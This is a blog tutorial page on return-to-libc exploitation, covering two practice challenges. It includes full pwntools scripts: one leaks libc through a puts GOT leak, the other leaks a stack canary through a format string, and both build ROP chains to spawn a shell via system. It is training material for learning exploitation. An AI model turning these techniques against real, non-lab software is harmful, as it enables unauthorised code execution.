<!DOCTYPE html>
<html lang="en">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <meta name="google-translate-customization" content="108d9124921d80c3-80e20d618ff053c8-g4f02ec6f3dba68b7-c">
<!-- Begin Jekyll SEO tag v2.7.1 -->
<title>Return to libc | TourPran Blogs</title>
<meta name="generator" content="Jekyll v4.2.0">
<meta property="og:title" content="Return to libc">
<meta name="author" content="tourpran">
<meta property="og:locale" content="en_US">
<meta name="description" content="This is my blog for Binary Exploitation and Reverse Engineering.">
<meta property="og:description" content="This is my blog for Binary Exploitation and Reverse Engineering.">
<link rel="canonical" href="http://tourpran.me/pwn-training/2021/05/24/return2libcpwntrain.html">
<meta property="og:url" content="http://tourpran.me/pwn-training/2021/05/24/return2libcpwntrain.html">
<meta property="og:site_name" content="TourPran Blogs">
<meta property="og:type" content="article">
<meta property="article:published_time" content="2021-05-24T00:00:00+05:30">
<meta name="twitter:card" content="summary">
<meta property="twitter:title" content="Return to libc">
<script type="application/ld+json">
{"@type":"BlogPosting","headline":"Return to libc","dateModified":"2021-05-24T00:00:00+05:30","datePublished":"2021-05-24T00:00:00+05:30","url":"http://tourpran.me/pwn-training/2021/05/24/return2libcpwntrain.html","mainEntityOfPage":{"@type":"WebPage","@id":"http://tourpran.me/pwn-training/2021/05/24/return2libcpwntrain.html"},"author":{"@type":"Person","name":"tourpran"},"description":"This is my blog for Binary Exploitation and Reverse Engineering.","@context":"https://schema.org"}</script>
<!-- End Jekyll SEO tag -->
<link rel="shortcut icon" href="">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-noto-sans@0.0.72/index.min.css">
  <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/10.1.1/styles/default.min.css">
  <script src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/10.1.1/highlight.min.js"></script>
  <!-- and it's easy to individually load additional languages -->
  <script charset="UTF-8" src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/10.1.1/languages/go.min.js"></script>
  <link rel="stylesheet" href="/assets/css/main.css">
  <script src="/assets/js/main.js"></script><link type="application/atom+xml" rel="alternate" href="http://tourpran.me/feed.xml" title="TourPran Blogs">
</head>
<body>



















<header class="site-header " role="banner">

  <div class="wrapper">
    <div class="site-header-inner">
<span class="site-brand"><a class="site-brand-inner" rel="author" href="/">
  <img class="site-favicon" title="TourPran Blogs" src="" onerror="this.style.display='none'">
  TourPran Blogs
</a>
</span><nav class="site-nav">
          <input type="checkbox" id="nav-trigger" class="nav-trigger">
          <label for="nav-trigger">
            <span class="menu-icon">
              <svg viewbox="0 0 18 15" width="18px" height="15px">
                <path d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.032C17.335,0,18,0.665,18,1.484L18,1.484z M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.032C17.335,6.031,18,6.696,18,7.516L18,7.516z M18,13.516C18,14.335,17.335,15,16.516,15H1.484 C0.665,15,0,14.335,0,13.516l0,0c0-0.82,0.665-1.483,1.484-1.483h15.032C17.335,12.031,18,12.695,18,13.516L18,13.516z"></path>
              </svg>
            </span>
          </label>

          <div class="trigger">
<a class="page-link" href="/">HOME</a><a class="page-link" href="/pwntrain.html">PWN TRAINING</a><a class="page-link" href="/categories.html">CATEGORIES</a><a class="page-link" href="/portfolio.html">PORTFOLIO</a>




</div>
        </nav>
</div>
  </div>
</header>

<script>
  (function() {
    var lastScrollY = getScrollPos().y;
    var documentElement = document.documentElement;

    function storeScrollData() {
      var y = getScrollPos().y;var scrollStatus = "";

      if (y <= 0) {
        scrollStatus = "top";
      } else if ((window.innerHeight + y) >= document.body.offsetHeight) {
        scrollStatus = "bottom";
      } else {
        var isScrollDown = (y - lastScrollY > 0) ? true : false;
        scrollStatus = isScrollDown ? "down" : "up";
      }

      lastScrollY = y;
      documentElement.setAttribute("data-scroll-status", scrollStatus);
    }

    window.addEventListener('scroll', function(e) {
      storeScrollData();
    });

    storeScrollData();
  })();
</script>










































<script>
  function hashLocate(hashValue) {
    hashValue = hashValue.replace(/^.*#h-/, '');
    var element = document.getElementById(hashValue);

    if (!element) {
      return;
    }

    var header = document.querySelector('header.site-header');
    var headerRect = header.getBoundingClientRect();
    var headerTop = Math.floor(headerRect.top);
    var headerHeight = Math.floor(headerRect.height);
    var scrollPos = getScrollPos();
    var offsetY = element.offsetTop - (headerTop + headerHeight + 20);

    if (offsetY == scrollPos.y) {
      return;
    }

    if (headerTop == 0  && offsetY > scrollPos.y) {
      offsetY += headerHeight + 2;
    } else if (headerTop < 0  && offsetY < scrollPos.y) {
      offsetY -= headerHeight - 2;
    }

    smoothScrollTo(offsetY);
  }

  // The first event occurred
  window.addEventListener('load', function(event) {
    if (window.location.hash) {
      hashLocate(window.location.hash);
    }
  });

  // The first event occurred
  window.addEventListener('click', function(event) {
    if (event.target.matches('a')) {
      hashLocate(event.target.getAttribute('href'));
    }
  });
</script>
<main class="page-content" aria-label="Content">
      <div class="wrapper">
        <div class="framework">
  <section class="main">

     <div class="post">
  <section>









<header class="post-header">
  <h1 class="post-title p-name" itemprop="name headline">Return to libc</h1>
  <h3 class="post-subtitle"></h3>

  <p class="post-meta">
    <time class="dt-published" datetime="2021-05-24T00:00:00+05:30" itemprop="datePublished"><i class="fa fa-calendar"></i> 24 May 2021
    </time>

    





















    <span class="post-reading-time left-vsplit"><i class="fa fa-clock-o"></i> About 14 mins</span>
  </p>
<div class="post-tags">
<a class="post-tag" href="/tags.html#libc%20leak">#libc leak</a><a class="post-tag" href="/tags.html#ret2libc">#ret2libc</a>
</div></header>
<article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">

    <div class="post-content e-content" itemprop="articleBody">

      <p><img src="/assets/images/pwntraining3/pwntrain1.png" alt=""></p>

<h3 id="introduction">Introduction:</h3>

<p>In this blog we will be trying to leak a libc address and try to get a shell by calling system. Here we will look into 2 challenges with similar attacks but slight variations.</p>

<h3 id="challenge-1">Challenge 1:</h3>

<p>Here we are given a binary and the source for the binary.</p>

<p><a href="/assets/images/pwntraining3/ret2libc">vuln binary</a> and 
<a href="/assets/images/pwntraining3/ret2libc.c">vuln c code</a></p>

<h3 id="solution">Solution:</h3>

<h4 id="mitigations">Mitigations:</h4>

<p>Lets check out the mitigations for this program.</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>checksec <span class="nt">--file</span> ./ret2libc
</code></pre></div></div>

<p><img src="/assets/images/pwntraining3/pwntrain2.png" alt=""></p>

<p>If you don’t have checksec installed then</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>apt <span class="nb">install </span>checksec
</code></pre></div></div>

<p><strong>RELRO</strong>:</p>
<ul>
  <li>Partial RELRO - the got is writeable, nothing much to bother here.</li>
</ul>

<p><strong>CANARY</strong>:</p>
<ul>
  <li>No canary, we can do a overflow peacefully :)</li>
</ul>

<p><strong>No eXecute</strong>:</p>
<ul>
  <li>NX Enabled - this makes sure that the code on the stack is not excecuted.</li>
</ul>

<p><strong>PIE</strong>:</p>
<ul>
  <li>PIE Disabled, we know the address of all the code in the binary.</li>
</ul>

<h4 id="code-walkthrough">Code walkthrough:</h4>

<p>main function:</p>

<p><img src="/assets/images/pwntraining3/pwntrain3.png" alt=""></p>

<ul>
  <li>Since gets is a vulnerable function, we can use it to write more data than what the buffer can hold.</li>
  <li>Also there are no win functions this time. We have to rely on the shared object.</li>
  <li>Lets explore this challenge now.</li>
</ul>

<h4 id="global-offset-table">Global Offset Table:</h4>

<p>This challenge requires you to know the basics of GOT and PLT. In short GOT is a set of address that points to the function in the glibc (shared library). To know more about <a href="https://tourpran.me/blogs/2020/09/13/got-plt.html">Global offset table go ahead to my old blog</a>.</p>

<h4 id="exploit-idea">Exploit Idea:</h4>

<ul>
  <li>Our aim right now is to leak an address in the libc (shared library). Since ASLR will randomise the library we cant access the libc function with same address all the time.</li>
  <li>There is a function called system in the libc which will pop a shell if we give the address of <code class="language-plaintext highlighter-rouge">/bin/sh</code> as the parameter.</li>
</ul>

<p>→ We can use the puts function to call the got of puts, since its already called by our program, the GOT of this function will be resolved ( real address pointing to libc will be filled ).</p>

<h4 id="pseudo-code">Pseudo code:</h4>

<p><strong>note</strong>: arguments to functions are stored via registers, the first argument is stored in RDI.</p>

<pre><code class="language-.">"A"*(offset) + p64(address of pop RDI) +  p64(GOT address of puts) + p64(PLT address of puts) + p64(address of main)
</code></pre>

<p>This code will fill the buffer with garbage and store the GOT address of puts inside the RDI register and then calls puts, this will leak the puts libc address.</p>

<ul>
  <li>Now we have the libc puts address.</li>
  <li>All functions and variables in the libc is relative to one another, libc as a whole might change its position but the elements (functions, variables) will be at the same relative distance from one another.</li>
  <li>we can calculate the address of string “/bin/sh” and the address of system function, then we can call the system with the argument to pop a shell.</li>
</ul>

<p><strong>note:</strong> You might face a error in the statement movabs. If you encounter this problem, you can rectify it by adding a return instruction before the call to a glibc function, Since adding a return address will make the RSP 16 byte aligned.</p>

<h4 id="exploit">Exploit:</h4>

<p>In real life situation you are not probably using the same libc as the software dev, So to find out the libc version go to <a href="https://libc.blukat.me/">libc.blukat.me</a>.</p>

<p>So always the last 3 digits (hex) of the leak will be same. Use this as an advantage to select your libc version.</p>

<p><img src="/assets/images/pwntraining3/pwntrain4.png" alt=""></p>

<p>Below is the commented solution.</p>

<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python3
</span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="c1"># Set up pwntools for the correct architecture
</span><span class="n">context</span><span class="p">.</span><span class="n">update</span><span class="p">(</span><span class="n">arch</span><span class="o">=</span><span class="s">'amd64'</span><span class="p">)</span>
<span class="n">exe</span> <span class="o">=</span> <span class="s">'./ret2libc'</span>
<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">"./ret2libc"</span><span class="p">)</span>

<span class="c1"># ./exploit.py DEBUG NOASLR
</span>

<span class="k">def</span> <span class="nf">start</span><span class="p">(</span><span class="n">argv</span><span class="o">=</span><span class="p">[],</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">):</span>
    <span class="s">'''Start the exploit against the target.'''</span>
    <span class="k">if</span> <span class="n">args</span><span class="p">.</span><span class="n">GDB</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">gdb</span><span class="p">.</span><span class="n">debug</span><span class="p">([</span><span class="n">exe</span><span class="p">]</span> <span class="o">+</span> <span class="n">argv</span><span class="p">,</span> <span class="n">gdbscript</span><span class="o">=</span><span class="n">gdbscript</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">process</span><span class="p">([</span><span class="n">exe</span><span class="p">]</span> <span class="o">+</span> <span class="n">argv</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>


<span class="c1"># ./exploit.py GDB
</span><span class="n">gdbscript</span> <span class="o">=</span> <span class="s">'''
b* 0x00000000004011c7
'''</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="o">**</span><span class="nb">locals</span><span class="p">())</span>

<span class="c1">#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
</span>
<span class="n">p</span> <span class="o">=</span> <span class="n">start</span><span class="p">()</span>

<span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Are you in?"</span><span class="p">)</span> <span class="c1"># recv the output sent by the program.
</span><span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s">"A"</span><span class="o">*</span><span class="mh">0x60</span> <span class="o">+</span> <span class="sa">b</span><span class="s">"B"</span><span class="o">*</span><span class="mi">8</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000401016</span><span class="p">)</span> <span class="o">+</span>  <span class="n">p64</span><span class="p">(</span><span class="mh">0x000000000040122b</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">elf</span><span class="p">.</span><span class="n">got</span><span class="p">[</span><span class="s">'puts'</span><span class="p">])</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">elf</span><span class="p">.</span><span class="n">plt</span><span class="p">[</span><span class="s">'puts'</span><span class="p">])</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">elf</span><span class="p">.</span><span class="n">sym</span><span class="p">.</span><span class="n">main</span><span class="p">))</span>
<span class="c1"># filling the buffer and RBP + return instruction to tackle the alignment issues + pop RDI to fill it with address of the puts function. add main to return back to main function
</span><span class="n">p</span><span class="p">.</span><span class="n">recvline</span><span class="p">()</span> <span class="c1"># recv unwanted bytes.
</span><span class="n">leak_puts</span> <span class="o">=</span><span class="nb">hex</span><span class="p">(</span> <span class="n">u64</span><span class="p">((</span><span class="n">p</span><span class="p">.</span><span class="n">recvline</span><span class="p">().</span><span class="n">rstrip</span><span class="p">()).</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x00</span><span class="s">"</span><span class="p">)))</span> <span class="c1"># recv the puts function and strip the front and back, unpack it and store it as hex.
</span>
<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"puts: "</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">leak_puts</span><span class="p">))</span> <span class="c1"># make sure you get a address in the libc by logging it.
</span>
<span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Are you in?"</span><span class="p">)</span> <span class="c1"># recv output.
</span><span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s">"B"</span><span class="o">*</span><span class="mh">0x60</span> <span class="o">+</span> <span class="sa">b</span><span class="s">"C"</span><span class="o">*</span><span class="mi">8</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x000000000040122b</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">leak_puts</span><span class="p">,</span> <span class="mi">16</span><span class="p">)</span> <span class="o">+</span> <span class="mh">0x13000a</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">leak_puts</span><span class="p">,</span> <span class="mi">16</span><span class="p">)</span><span class="o">-</span><span class="mh">0x32190</span><span class="p">))</span>
<span class="c1"># fill garbage in buffer and pop RDI to fill it with a pointer to "bin/sh" call system.
</span>
<span class="n">p</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>

</code></pre></div></div>

<h3 id="challenge-2">Challenge 2:</h3>

<p>In this second challenge you are required to perform the same ret2libc but with more security measures to bypass. Below you can download source and bianry.</p>

<p><a href="/assets/images/pwntraining3/ret2libc_canary">vuln binary</a> and 
<a href="/assets/images/pwntraining3/ret2libc_canary.c">vuln c code</a></p>

<h3 id="solution-1">Solution:</h3>
<p>Lets do the drill of checking the mitigations.</p>

<h4 id="mitigations-1">Mitigations:</h4>
<p><img src="/assets/images/pwntraining3/pwntrain5.png" alt=""></p>

<p><strong>Canary:</strong></p>
<ul>
  <li>A set of characters that will be checked before returning. If the value has changed the program aborts.</li>
</ul>

<p><strong>No eXecute:</strong></p>
<ul>
  <li>NX Enabled - this makes sure that the code on the stack is not excecuted.</li>
</ul>

<p><strong>PIE:</strong></p>
<ul>
  <li>PIE Enabled, We dont know the address of the code for the binary.</li>
</ul>

<h4 id="code-walkthrough-1">Code Walkthrough:</h4>

<p>There is only a main function.
<img src="/assets/images/pwntraining3/pwntrain6.png" alt=""></p>

<p>We can see that, here we are getting an input and printing it in an unsafe way. Here we can take advantage of this to leak data in the binary. <a href="https://tourpran.me/pwn-training/2021/05/20/format-string-exploitation-training2.html">Not sure about format string ? Go Here</a>. In the next section we can use the gets function to input more data than the buffer can store.</p>

<h4 id="canary">Canary:</h4>
<p>Set of characters that is placed in between the return address and the buffer. When a buffer overflow occurs the canary checks itself with a memory copy. If the values has been modified then we know a overflow happened and the program will abort.</p>

<p><img src="/assets/images/pwntraining3/pwntrain7.jpg" alt=""></p>

<blockquote>
  <p>Bypass: Basically we can leak the canary from format strings and place the canary in the correct spot in the payload. Since we over write the canary with the real canary, it seems there was no overflow.</p>
</blockquote>

<h4 id="exploit-1">Exploit:</h4>

<ul>
  <li>Lets try to leak some variables from the stack by giving some %p.</li>
  <li>We can store all of them in a list and analyse what is what.</li>
</ul>

<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">p</span> <span class="o">=</span> <span class="n">start</span><span class="p">()</span>

<span class="c1"># phase 1 : leaking binary and libc address
</span><span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"So you wanna try again. Go ahead :)"</span><span class="p">,</span> <span class="sa">b</span><span class="s">"%p "</span><span class="o">*</span><span class="mi">25</span><span class="p">)</span>
<span class="n">all_leaked</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="n">recvline</span><span class="p">()).</span><span class="n">split</span><span class="p">()</span>
<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Info leaked: "</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">all_leaked</span><span class="p">))</span>
</code></pre></div></div>

<p><img src="/assets/images/pwntraining3/pwntrain8.png" alt=""></p>

<ul>
  <li>We can confirm that the address <code class="language-plaintext highlighter-rouge">0x7ffff7faea03</code> is from the libc, nice ! we already got a leak. Attach gdb and check what the address corresponds to.</li>
</ul>

<p><img src="/assets/images/pwntraining3/pwntrain9.png" alt=""></p>

<p>Ok this is a libc function, we can calculate the offset of this function from the libc base. Now lets see if any other important info is leaked.<img class="emoji" title=":thinking:" alt=":thinking:" raw="🤔" src="https://github.githubassets.com/images/icons/emoji/unicode/1f914.png" style="vertical-align: middle; display: inline; max-width: 1em; visibility: hidden;" onload="this.style.visibility='visible'" onerror="this.replaceWith(this.getAttribute('raw'))"></p>

<p>Address that is <code class="language-plaintext highlighter-rouge">0x5555555550a0</code>, is a address that is winthin the binary, we can calculate the offset like the previous one.</p>

<p>Finally lets see if the canary is also included in the stack. Yes it is indeed inside the stack and can clearly see it.</p>

<p><img src="/assets/images/pwntraining3/pwntrain10.png" alt=""></p>

<p>Now to find the position of canary we can set a break point in the address before the <code class="language-plaintext highlighter-rouge">__stack_chk_fail@plt</code>. The stack will be stored in the <code class="language-plaintext highlighter-rouge">RCX</code> register. Create a offset pattern then see what value is in the <code class="language-plaintext highlighter-rouge">RCX</code> register and place the canary value there to complete the exploit.</p>

<p>Now it is simple. We can simply calculate all the relative offset from the base of binary and libc, So we can now <code class="language-plaintext highlighter-rouge">pop rdi</code> to populate it with the address of <code class="language-plaintext highlighter-rouge">/bin/sh</code> and call <code class="language-plaintext highlighter-rouge">system</code>. Below I have given the commented solution.</p>

<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python3
</span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="c1"># Set up pwntools for the correct architecture
</span><span class="n">context</span><span class="p">.</span><span class="n">update</span><span class="p">(</span><span class="n">arch</span><span class="o">=</span><span class="s">'amd64'</span><span class="p">)</span>
<span class="n">exe</span> <span class="o">=</span> <span class="s">'./ret2libc_canary'</span>
<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">"./ret2libc_canary"</span><span class="p">)</span>
<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">"/lib/x86_64-linux-gnu/libc.so.6"</span><span class="p">)</span>
<span class="c1"># ./exploit.py DEBUG NOASLR
</span>

<span class="k">def</span> <span class="nf">start</span><span class="p">(</span><span class="n">argv</span><span class="o">=</span><span class="p">[],</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">):</span>
    <span class="s">'''Start the exploit against the target.'''</span>
    <span class="k">if</span> <span class="n">args</span><span class="p">.</span><span class="n">GDB</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">gdb</span><span class="p">.</span><span class="n">debug</span><span class="p">([</span><span class="n">exe</span><span class="p">]</span> <span class="o">+</span> <span class="n">argv</span><span class="p">,</span> <span class="n">gdbscript</span><span class="o">=</span><span class="n">gdbscript</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">process</span><span class="p">([</span><span class="n">exe</span><span class="p">]</span> <span class="o">+</span> <span class="n">argv</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>


<span class="c1"># ./exploit.py GDB
</span><span class="n">gdbscript</span> <span class="o">=</span> <span class="s">'''
b* main+164
'''</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="o">**</span><span class="nb">locals</span><span class="p">())</span>

<span class="c1">#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
</span>
<span class="n">p</span> <span class="o">=</span> <span class="n">start</span><span class="p">()</span>

<span class="c1"># phase 1 : leaking binary and libc address
</span><span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"So you wanna try again. Go ahead :)"</span><span class="p">,</span> <span class="sa">b</span><span class="s">"%p "</span><span class="o">*</span><span class="mi">25</span><span class="p">)</span> <span class="c1"># send format specifier to leak data from the stack
</span><span class="n">p</span><span class="p">.</span><span class="n">recvline</span><span class="p">()</span> <span class="c1"># recv the new line.
</span>
<span class="n">all_leaked</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="n">recvline</span><span class="p">()).</span><span class="n">split</span><span class="p">()</span> <span class="c1"># store all leaked data as a list.
</span><span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Info leaked: "</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">all_leaked</span><span class="p">))</span> <span class="c1"># log it to make sure everything works fine
</span><span class="n">libc_base</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">all_leaked</span><span class="p">[</span><span class="mi">0</span><span class="p">])[</span><span class="mi">2</span><span class="p">:],</span> <span class="mi">16</span><span class="p">)</span> <span class="o">-</span> <span class="mi">2013699</span> <span class="c1"># take the first element in the list which is a libc function.
</span><span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Libc Base: "</span><span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">libc_base</span><span class="p">)))</span> <span class="c1"># log it
</span><span class="n">binary_base</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">all_leaked</span><span class="p">[</span><span class="o">-</span><span class="mi">6</span><span class="p">])[</span><span class="mi">2</span><span class="p">:],</span> <span class="mi">16</span><span class="p">)</span> <span class="o">-</span> <span class="mi">4256</span> <span class="c1"># calculate the binary offset from the leak.
</span><span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"binary_base: "</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">binary_base</span><span class="p">)))</span> <span class="c1"># log it
</span><span class="n">canary</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">all_leaked</span><span class="p">[</span><span class="o">-</span><span class="mi">4</span><span class="p">])[</span><span class="mi">2</span><span class="p">:],</span> <span class="mi">16</span><span class="p">)</span> <span class="c1"># store the canary from the leak
</span>
<span class="c1"># pahse 2 : usign the leak to ret2libc
</span>
<span class="n">buf</span> <span class="o">=</span> <span class="sa">b</span><span class="s">"A"</span><span class="o">*</span><span class="p">(</span><span class="mh">0x60</span><span class="o">+</span><span class="mi">8</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">canary</span><span class="p">)</span> <span class="c1"># fill the buffer till the canary and overwrite the canary with real one.
</span><span class="n">buf</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">binary_base</span><span class="o">+</span><span class="mh">0x0000000000001016</span><span class="p">)</span> <span class="c1"># random garbage to fill the rbp
</span><span class="n">buf</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">binary_base</span><span class="o">+</span><span class="mh">0x00000000000012cb</span><span class="p">)</span> <span class="c1"># return address
</span><span class="k">print</span><span class="p">(</span><span class="nb">next</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">search</span><span class="p">(</span><span class="sa">b</span><span class="s">'/bin/sh</span><span class="se">\x00</span><span class="s">'</span><span class="p">)))</span> <span class="c1"># find the address of libc bin/sh
</span><span class="n">buf</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc_base</span> <span class="o">+</span> <span class="nb">next</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">search</span><span class="p">(</span><span class="sa">b</span><span class="s">'/bin/sh</span><span class="se">\x00</span><span class="s">'</span><span class="p">)))</span> 
<span class="n">buf</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">binary_base</span><span class="o">+</span><span class="mh">0x0000000000001016</span><span class="p">)</span> <span class="c1"># return to make sure stack is aligned before a glibc call
</span><span class="n">buf</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">.</span><span class="n">system</span><span class="p">)</span> <span class="c1"># call system.
</span>
<span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"Missed again??? I'm so disappointed."</span><span class="p">,</span> <span class="n">buf</span><span class="p">)</span>


<span class="n">p</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
</code></pre></div></div>

<p>Hope you loved this challenge in the training !! :D</p>


    </div>

</article>
<div class="post-nav">
<a class="previous" href="/pwn-training/2021/05/20/format-string-exploitation-training2.html" title="Format String Exploitation">Format String Exploitation</a><a class="next" href="/writeup/2021/12/30/inctfjquals.html" title="Leaky pipes - InCTFj Quals">Leaky pipes - InCTFj Quals</a>
</div>
<div class="post-related">
      <div>Related Articles</div>
      <ul>
        <li><a class="post-link" href="/writeup/2021/02/07/babyropdice.html" title="Leaky pipes - InCTFj Quals">babyROP | DiceGang CTF</a></li>
<li><a class="post-link" href="/pwn-training/2021/05/20/format-string-exploitation-training2.html" title="Leaky pipes - InCTFj Quals">Format String Exploitation</a></li>
<li><a class="post-link" href="/youtube/2020/07/28/introduction.html" title="Leaky pipes - InCTFj Quals">Introduction to Assembly Programming - 00</a></li>
<li><a class="post-link" href="/writeup/2020/04/29/pwnabletw1.html" title="Leaky pipes - InCTFj Quals">Start - pwnable.tw</a></li>
</ul>
    </div>
<div class="post-comments">
<div id="disqus_thread"></div>
<script>
  var disqus_config = function () {
    this.page.url = 'http://tourpran.me/pwn-training/2021/05/24/return2libcpwntrain.html';
    this.page.identifier = 'http://tourpran.me/pwn-training/2021/05/24/return2libcpwntrain.html';
  };
  (function() {
    var d = document, s = d.createElement('script');
    s.src = 'https://tourpran.disqus.com/embed.js';
    s.setAttribute('data-timestamp', +new Date());
    (d.head || d.body).appendChild(s);
  })();
</script>
<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow">comments powered by Disqus.</a>
</noscript>
</div></section>
</div>


  </section>
  <section class="sidebar" style="margin-left: 15px;">
    <!-- Get sidebar items --><style type="text/css" media="screen">
.post-menu ul {
  list-style: none;
  padding: 0;
  margin: 0;
}
</style>

<div class="post-menu">
  <div class="post-menu-title">TOC</div>
  <div class="post-menu-content"></div>
</div>

<script>
  function generateContent() {
    var menu = document.querySelector(".post-menu");
    var menuContent =  menu.querySelector(".post-menu-content");
    var headings = document.querySelector(".post-content").querySelectorAll("h2, h3, h4, h5, h6");

    // Hide menu when no headings
    if (headings.length === 0) {
      return menu.style.display = "none";
    }

    // Generate post menu
    var menuHTML = '';
    for (var i = 0; i < headings.length; i++) {
      var h = headings[i];
      menuHTML += (
        '<li class="h-' + h.tagName.toLowerCase() + '">'
        + '<a href="#h-' + h.getAttribute('id') + '">' + h.textContent + '</a></li>');
    }

    menuContent.innerHTML = '<ul>' + menuHTML + '</ul>';

    // The header element
    var header = document.querySelector('header.site-header');

    function doMenuCollapse(index, over_items=20) {
      var items = menuContent.firstChild.children;

      if (items.length < over_items) {
        return;
      }

      var activeItem = items[index];
      var beginItem = activeItem
      var endItem = activeItem
